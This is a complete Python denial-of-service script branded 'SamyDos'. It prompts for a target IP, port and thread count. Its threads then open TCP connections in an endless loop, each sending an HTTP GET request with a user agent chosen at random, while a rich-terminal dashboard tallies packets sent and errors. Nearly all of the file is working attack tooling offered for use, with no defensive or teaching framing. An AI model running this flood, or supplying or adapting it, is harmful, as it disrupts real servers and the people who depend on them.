#!/usr/bin/env python3

import socket
import threading
import time
import random
from rich.live import Live
from rich.table import Table
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

console = Console()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.68.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
    "python-requests/2.25.1"
]

TARGET = input("Enter target IP or domain: ").strip()
PORT = int(input("Enter target port: ").strip())
THREADS = int(input("Number of threads: ").strip())

packet_count = 0
error_count = 0
lock = threading.Lock()

ASCII_ART = r"""
                                                         c=====e
                                                            H
   ____________                                         _,,_H____
  (__((__((___()                                       //|       |
 (__((__((___()()_____________________________________// |SamyDos|
(__((__((___()()()------------------------------------'  |_______|


"""

def attack():
    global packet_count, error_count
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET, PORT))
            request = f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            s.send(request.encode("utf-8"))
            s.close()
            with lock:
                packet_count += 1
        except:
            with lock:
                error_count += 1
            time.sleep(0.05)

def build_dashboard():
    table = Table(title=f"[bold magenta]DoS Attack Stats — Target: {TARGET}:{PORT}")
    table.add_column("Metric", justify="left", style="cyan")
    table.add_column("Value", justify="right", style="green")
    with lock:
        table.add_row("Packets Sent", str(packet_count))
        table.add_row("Errors", str(error_count))
        table.add_row("Threads", str(THREADS))

    layout = Table.grid(padding=1)
    ascii_panel = Panel.fit(Text(ASCII_ART, style="bold blue"), border_style="blue")
    layout.add_row(ascii_panel)
    layout.add_row(table)
    return Align.center(layout)

def start():
    console.print(f"\n[bold yellow]Starting DoS attack on {TARGET}:{PORT} with {THREADS} threads...\n")
    
    for _ in range(THREADS):
        t = threading.Thread(target=attack, daemon=True)
        t.start()

    with Live(build_dashboard(), refresh_per_second=1, screen=True) as live:
        while True:
            time.sleep(1)
            live.update(build_dashboard())

if __name__ == "__main__":
    start()

